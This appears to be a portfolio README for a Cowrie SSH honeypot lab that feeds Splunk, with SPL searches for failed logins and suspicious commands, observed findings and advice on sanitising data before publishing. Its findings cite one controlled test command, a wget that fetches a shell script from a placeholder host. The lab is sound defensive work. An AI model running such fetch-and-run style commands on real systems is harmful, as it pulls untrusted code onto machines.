# Cowrie SSH Honeypot & Splunk SOC Lab

A hands-on blue-team portfolio project demonstrating SSH honeypot deployment, centralized log collection, Splunk detection engineering, alerting, and incident documentation.

> **Research/portfolio lab only.** This project is a deception environment for observing unsolicited SSH activity. It is not a production security control and must not be connected to systems containing real data.

## Project overview

The lab uses [Cowrie](https://cowrie.readthedocs.io/) to emulate an SSH server and record interactions. A Splunk Universal Forwarder ships Cowrie JSON events to Splunk Enterprise for searching, dashboards, and alerting.

### Architecture

                         WIDER INTERNET
                  (External Users, Bots, Attackers)
                               |
                               |
                     SSH - TCP PORT 2222
                               |
                               v
             +----------------------------------+
             |       DIGITALOCEAN CLOUD VPS     |
             |  Public IP: -  YOUR_HONEYPOT_IP  |
             |       Ubuntu Server 24.04        |
             |                                  |
             |   +--------------------------+   |
             |   |      COWRIE HONEYPOT     |   |
             |   |                          |   |
             |   |  - SSH Emulation         |   |
             |   |  - Fake Linux Shell      |   |
             |   |  - Login Attempt Logging |   |
             |   |  - Command Capture       |   |
             |   +--------------------------+   |
             |                |                 |
             |                v                 |
             |   +--------------------------+   |
             |   |      COWRIE JSON LOGS    |   |
             |   |  /var/log/cowrie/        |   |
             |   +--------------------------+   |
             |                |                 |
             |                v                 |
             |   +--------------------------+   |
             |   | SPLUNK UNIVERSAL         |   |
             |   | FORWARDER                |   |
             |   |                          |   |
             |   | Forwards Cowrie logs     |   |
             |   +--------------------------+   |
             +----------------|-----------------+
                              |
                              |
                    TAILSCALE PRIVATE NETWORK
                    Encrypted Log Transmission
                              |
                       TCP PORT 9997
                              |
                              v
        +--------------------------------------------+
        |           LOCAL WINDOWS 11 PC              |
        |                                            |
        |  +--------------------------------------+  |
        |  |           VIRTUALBOX VM               |  |
        |  |                                      |  |
        |  |   Ubuntu Server 24.04                |  |
        |  |            |                         |  |
        |  |            v                         |  |
        |  |   +----------------------------+     |  |
        |  |   |     SPLUNK ENTERPRISE      |     |  |
        |  |   |                            |     |  |
        |  |   |  - TCP Receiver: 9997      |     |  |
        |  |   |  - Index: cowrie           |     |  |
        |  |   |  - Search & Analysis       |     |  |
        |  |   |  - Dashboards & Alerts     |     |  |
        |  |   +----------------------------+     |  |
        |  |                |                     |  |
        |  +----------------|---------------------+  |
        |                   |                        |
        |          VirtualBox NAT                    |
        |          Port Forwarding                   |
        |       127.0.0.1:8000 (private IP)          |
        |                   |                        |
        |                   v                        |
        |          +------------------+              |
        |          |  GOOGLE CHROME   |              |
        |          |  Splunk Web UI   |              |
        |          | localhost:8000   |              |
        |          +------------------+              |
        +--------------------------------------------+
        
## Lab components

| Component | Purpose |
|---|---|
| Cowrie | SSH honeypot and session/event logging |
| Ubuntu Server 24.04 | Honeypot host |
| Splunk Universal Forwarder | Log collection and forwarding |
| Splunk Enterprise | SIEM search, dashboards, and alerts |
| Tailscale | Private transport between the forwarder and Splunk receiver |
| DigitalOcean | Cloud VPS hosting |

## What this project demonstrates

- Linux server setup and service management
- SSH honeypot deployment and configuration
- Centralized JSON log collection
- Splunk indexing and SPL searches
- Authentication-failure detection
- Suspicious command-pattern detection
- Source-IP and username aggregation
- Time-series analysis of authentication attempts
- Alert configuration and dashboard development
- Incident triage, evidence handling, and reporting

## Observed lab findings

During the documented observation window, Splunk returned:

- 9 failed SSH authentication events for the `root` account from one source across 9 sessions, spanning approximately 84.25 seconds.
- 2 additional failed authentication events from two other source addresses.
- 11 failed authentication events in total after excluding the analyst's known test source.
- A controlled command test using `wget http://example.invalid/test.sh`, which matched the suspicious-command search. This command was entered by the lab operator during testing; it is **not** evidence of an external actor executing that command.

The source addresses in the public report are anonymized. An IP address being external to the operator's test address does not, by itself, prove malicious intent or identify a person.

## Repository layout

```text
.
├── README.md
├── LICENSE
├── .gitignore
├── docs/
│   ├── incident-report.md
│   └── architecture.md
├── spl/
│   ├── failed-logins-by-source.spl
│   ├── brute-force-summary.spl
│   ├── attack-frequency.spl
│   ├── suspicious-commands.spl
│   ├── authentication-outcomes.spl
│   └── top-targeted-usernames.spl
└── evidence/
    └── README.md
```

## Quick start: useful SPL detections

The saved SPL examples are in [`spl/`](spl/). They assume Cowrie events are indexed in `index=cowrie` and use the Cowrie `eventid` field.

### Failed logins by source

```spl
index=cowrie earliest=-24h eventid="cowrie.login.failed"
| stats count as failed_attempts dc(username) as targeted_accounts values(username) as usernames by src_ip
| sort - failed_attempts
| head 10
```

### Brute-force summary for a source

```spl
index=cowrie earliest=-24h src_ip="<SOURCE_IP>" eventid="cowrie.login.failed"
| stats count as failed_attempts dc(session) as unique_sessions min(_time) as first_seen max(_time) as last_seen by src_ip username
| eval duration_seconds=round(last_seen-first_seen,2)
| eval attempts_per_minute=if(duration_seconds>0,round(failed_attempts/(duration_seconds/60),2),0)
| convert ctime(first_seen) ctime(last_seen)
```

Replace `<SOURCE_IP>` with an address from your own event data. Do not publish raw event data without reviewing it for credentials, personal information, and infrastructure details.

## Security and privacy before publishing

Before pushing your own configuration, logs, or screenshots to GitHub:

1. **Never commit passwords, API tokens, private SSH keys, Cowrie credentials, Splunk credentials, or Tailscale auth keys.**
2. Do not publish `cowrie.json`, raw packet captures, full session transcripts, or unreviewed Splunk exports. Cowrie logs may contain attempted passwords and other sensitive input.
3. Remove or mask your VPS public IP, home/public IP, Tailscale IPs, hostnames, usernames, email addresses, and account identifiers from screenshots and config files.
4. Review `inputs.conf`, `outputs.conf`, `cowrie.cfg`, and firewall screenshots before sharing. Keep only sanitized examples.
5. Avoid attributing an IP address to a person or organization without independent, reliable evidence.
6. Use a reserved documentation IP or a placeholder such as `<SOURCE_IP>` in public examples.

The `.gitignore` file is a safeguard, not a guarantee. Review `git status` and inspect every staged file before committing.

## Evidence

Add sanitized dashboard screenshots to `evidence/` if desired. The evidence folder currently contains instructions only. Screenshots should show the dashboard and detection outcomes without exposing live IP addresses, credentials, hostnames, or account details.

## Limitations

- Cowrie emulates a shell; commands entered into the honeypot are not commands executed on the underlying Ubuntu host.
- A honeypot only records activity that reaches it and does not represent all attacks against the internet.
- A failed-login burst is consistent with password guessing, but does not establish the source operator's identity or intent.
- The findings describe the lab's captured observation window, not a statistically representative threat assessment.
- This lab is not a substitute for endpoint protection, network segmentation, patching, or production monitoring.

## Future improvements

- I will be updating this repo with new findings periodically

## Authora

Ethan Miranda — Cybersecurity / SOC portfolio lab.

If you adapt this project, document your own environment and clearly distinguish controlled testing from unsolicited external activity.
